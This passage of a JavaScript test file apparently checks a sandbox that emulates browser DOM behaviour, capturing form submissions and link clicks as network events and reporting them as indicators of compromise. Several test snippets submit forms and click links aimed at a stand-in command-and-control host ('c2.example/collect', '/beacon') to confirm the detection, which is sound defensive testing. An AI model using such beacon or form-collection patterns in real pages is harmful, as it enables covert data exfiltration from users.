    )

    const writes = harness.trace.events.filter((event) => event.kind === 'dom' && event.op === 'set action')
    assert.equal(writes.length, 1, 'action writes are traced')
    assert.equal(writes[0].tag, 'form')
    assert.equal(writes[0].length, 'https://c2.example/collect'.length)
    assert.doesNotMatch(JSON.stringify(writes), /c2\.example/, 'the trace keeps the length, not the URL')

    // Without an action the form submits to the document URL.
    run(harness, `document.createElement('form').submit()`)
    const last = harness.trace.events.filter((event) => event.kind === 'net').pop()
    assert.equal(last.url, harness.profile.href)

    // Submission is captured, never performed.
    assert.equal(run(harness, 'document.URL'), harness.profile.href)
    assert.equal(run(harness, 'location.href'), harness.profile.href)
  } finally {
    harness.dispose()
  }
})

test('form action attributes and method properties reach the captured request', async () => {
  const harness = await createHarness({ modules: [...MODULES, 'location', 'network'] })
  try {
    const origin = new URL('/', harness.profile.href).origin
    const [action, attrAction, methodFromAttribute, rawMethod] = run(
      harness,
      `var form = document.createElement('form');
       form.setAttribute('action', '/rel-collect');
       form.setAttribute('method', 'post');
       [form.action, form.getAttribute('action'), form.method, form.getAttribute('method')];`,
    )
    assert.equal(
      action,
      `${origin}/rel-collect`,
      'setAttribute("action") is reflected by the action getter as an absolute URL',
    )
    assert.equal(attrAction, '/rel-collect', 'getAttribute still exposes the stored value')
    assert.equal(methodFromAttribute, 'post', 'setAttribute("method") is reflected by the method getter')
    assert.equal(rawMethod, 'post')

    const [propertyMethod, propertyRaw] = run(
      harness,
      `var form = document.createElement('form');
       form.method = 'POST';
       [form.method, form.getAttribute('method')];`,
    )
    assert.equal(propertyMethod, 'post', 'the method property reports the normalised value')
    assert.equal(propertyRaw, 'POST', 'the method property setter reflects the attribute')

    run(
      harness,
      `var fromAttributes = document.createElement('form');
       fromAttributes.setAttribute('action', 'https://c2.example/collect');
       fromAttributes.setAttribute('method', 'post');
       fromAttributes.submit();
       var fromProperty = document.createElement('form');
       fromProperty.method = 'post';
       fromProperty.action = 'https://c2.example/property';
       fromProperty.submit();
       var relative = document.createElement('form');
       relative.setAttribute('action', '/rel');
       relative.submit();`,
    )
    const net = harness.trace.events.filter((event) => event.kind === 'net')
    assert.deepEqual(
      net.map((event) => [event.method, event.url]),
      [
        ['POST', 'https://c2.example/collect'],
        ['POST', 'https://c2.example/property'],
        ['GET', `${origin}/rel`],
      ],
      'the captured request uses the reflected action and method, resolved against the document',
    )
    const iocs = harness.trace.events.filter((event) => event.kind === 'ioc')
    assert.ok(
      iocs.some((event) => event.value === 'https://c2.example/collect'),
      'the reflected action is reported as an IOC',
    )
  } finally {
    harness.dispose()
  }
})

test('anchor activation runs for descendant clicks and dispatched MouseEvents', async () => {
  const harness = await createHarness({ modules: [...MODULES, 'location', 'network'] })
  try {
    const [descendantTarget] = run(
      harness,
      `var link = document.createElement('a');
       link.setAttribute('href', 'https://c2.example/descendant');
       var span = document.createElement('span');
       link.appendChild(span);
       document.body.appendChild(link);
       span.click();
       [span.nodeName];`,
    )
    assert.equal(descendantTarget, 'SPAN')

    run(
      harness,
      `var disposed = document.createElement('a');
       disposed.href = 'https://c2.example/dispatched';
       disposed.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
       var guarded = document.createElement('a');
       guarded.href = 'https://c2.example/guarded';
       var child = document.createElement('span');
       guarded.appendChild(child);
       document.body.appendChild(guarded);
       guarded.addEventListener('click', function (event) { event.preventDefault() });
       child.click();`,
    )

    const net = harness.trace.events.filter((event) => event.kind === 'net')
    assert.deepEqual(
      net.map((event) => [event.method, event.url]),
      [
        ['GET', 'https://c2.example/descendant'],
        ['GET', 'https://c2.example/dispatched'],
      ],
      'a descendant click and a dispatched MouseEvent both run the anchor activation',
    )

    const iocs = harness.trace.events.filter((event) => event.kind === 'ioc')
    assert.ok(
      iocs.some((event) => event.value === 'https://c2.example/descendant'),
      'the descendant click target is reported as an IOC',
    )
    assert.ok(
      iocs.some((event) => event.value === 'https://c2.example/dispatched'),
      'the dispatched event target is reported as an IOC',
    )
    assert.ok(
      !iocs.some((event) => event.value === 'https://c2.example/guarded'),
      'a listener preventDefault on an ancestor cancels the activation',
    )
  } finally {
    harness.dispose()
  }
})

// A fragment-only (or otherwise same-document) anchor click is a navigation
// without egress: the event still dispatches, but no request or IOC is recorded.
test('fragment-only and same-document anchor clicks are not egress', async () => {
  const harness = await createHarness({ modules: [...MODULES, 'location', 'network'] })
  try {
    const [fired, fragmentHref] = run(
      harness,
      `(function () {
        var fired = 0;
        function mark() { fired += 1 }
        var fragment = document.createElement('a');
        fragment.href = '#section';
        fragment.addEventListener('click', mark);
        fragment.click();
        var sameDocument = document.createElement('a');
        sameDocument.href = document.URL + '#other';
        sameDocument.addEventListener('click', mark);
        sameDocument.click();
        var remote = document.createElement('a');
        remote.href = 'https://c2.example/beacon';
        remote.addEventListener('click', mark);
        remote.click();
        return [fired, fragment.getAttribute('href')];
      })()`,
    )
    assert.equal(fired, 3, 'the click event still dispatches for every anchor')
    assert.equal(fragmentHref, '#section', 'the fragment href is stored verbatim')

    const net = harness.trace.events.filter((event) => event.kind === 'net')
    assert.deepEqual(
      net.map((event) => event.url),
      ['https://c2.example/beacon'],
      'only the remote href reaches the network',
    )
    const urlIocs = harness.trace.events.filter((event) => event.kind === 'ioc' && event.iocKind === 'url')
    assert.deepEqual(
      urlIocs.map((event) => event.value),
      ['https://c2.example/beacon'],
      'no IOC is reported for a same-document navigation',
    )
  } finally {
    harness.dispose()
  }
})

test('URL property writes reflect to content attributes and form IDL uses HTML defaults', async () => {
  const harness = await createHarness({ modules: [...MODULES, 'location', 'network'] })
  try {
    const origin = new URL('/', harness.profile.href).origin
    const [rawHref, resolvedHref, rawSrc, removedHref, removedHas] = run(
      harness,
      `var link = document.createElement('a');
       link.href = '/y';
       var image = document.createElement('img');
       image.src = '/pixel.png';
       var gone = document.createElement('a');
       gone.href = '/z';
       gone.removeAttribute('href');
       [link.getAttribute('href'), link.href, image.getAttribute('src'),
        gone.getAttribute('href'), gone.hasAttribute('href')];`,
    )
    assert.equal(rawHref, '/y', 'a.href writes reflect to the href content attribute')
    assert.equal(resolvedHref, `${origin}/y`, 'the href getter resolves relative URLs')
    assert.equal(rawSrc, '/pixel.png', 'img.src writes reflect to the src content attribute')
    assert.equal(removedHref, null, 'removeAttribute drops the reflected attribute')
    assert.equal(removedHas, false)

    const [unsetAction, resolvedAction, propertyRaw, unknownMethod, postMethod, dialogMethod] = run(
      harness,
      `var blank = document.createElement('form');
       var explicit = document.createElement('form');
       explicit.action = '/collect';
       var unknown = document.createElement('form');
       unknown.setAttribute('method', 'POSTER');
       var posted = document.createElement('form');
       posted.setAttribute('method', 'post');
       var dialog = document.createElement('form');
       dialog.method = 'dialog';
       [blank.action, explicit.action, explicit.getAttribute('action'),
        unknown.method, posted.method, dialog.method];`,
    )
    assert.equal(
      unsetAction,
      harness.profile.href,
      'an unset action reports the resolved document URL',
    )
    assert.equal(resolvedAction, `${origin}/collect`, 'a relative action resolves against the document')
    assert.equal(propertyRaw, '/collect', 'the action property write reflects the raw attribute value')
    assert.equal(unknownMethod, 'get', 'an unknown method keyword uses the invalid value default')
    assert.equal(postMethod, 'post')
    assert.equal(dialogMethod, 'dialog')
  } finally {
    harness.dispose()
  }
})

test('listener identity is keyed by type, listener and capture', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [twoTypes, removedWrongType, stillRegistered, deduped] = run(
      harness,
      `(function () {
        var n = 0;
        var same = function () { n += 1 };
        window.addEventListener('tA', same);
        window.addEventListener('tB', same);
        window.dispatchEvent(new Event('tA'));
        window.dispatchEvent(new Event('tB'));
        var twoTypes = n;

        var m = 0;
        var handler = function () { m += 1 };
        window.addEventListener('c', handler);
        window.removeEventListener('d', handler);
        window.dispatchEvent(new Event('c'));
        var removedWrongType = m;
        window.removeEventListener('c', handler);
        window.dispatchEvent(new Event('c'));
        var stillRegistered = m;

        var k = 0;
        var once = function () { k += 1 };
        window.addEventListener('e', once);
        window.addEventListener('e', once);
        window.dispatchEvent(new Event('e'));
        return [twoTypes, removedWrongType, stillRegistered, k];
      })()`,
    )
    assert.equal(twoTypes, 2, 'the same listener may be registered for two event types')
    assert.equal(removedWrongType, 1, 'removeEventListener ignores a different event type')
    assert.equal(stillRegistered, 1, 'removeEventListener with the matching type removes it')
    assert.equal(deduped, 1, 'the same (type, listener, capture) triple is registered once')
  } finally {
    harness.dispose()
  }
})

test('bare global addEventListener/removeEventListener/dispatchEvent are bound to the window', async () => {
  const harness = await createHarness({ modules: MODULES })
  try {
    const [count, removed, bareDispatch] = run(
      harness,
      `(function () {
        var n = 0;
        function handler() { n += 1 }
        addEventListener('bare-global', handler);
        dispatchEvent(new Event('bare-global'));
        var count = n;
        removeEventListener('bare-global', handler);
        dispatchEvent(new Event('bare-global'));
        return [count, n, typeof dispatchEvent(new Event('bare-global'))];
      })()`,
    )
    assert.equal(count, 1, 'a bare addEventListener call registers on the global target')
    assert.equal(removed, 1, 'a bare removeEventListener call removes it')
    assert.equal(bareDispatch, 'boolean')
  } finally {
    harness.dispose()
  }
})
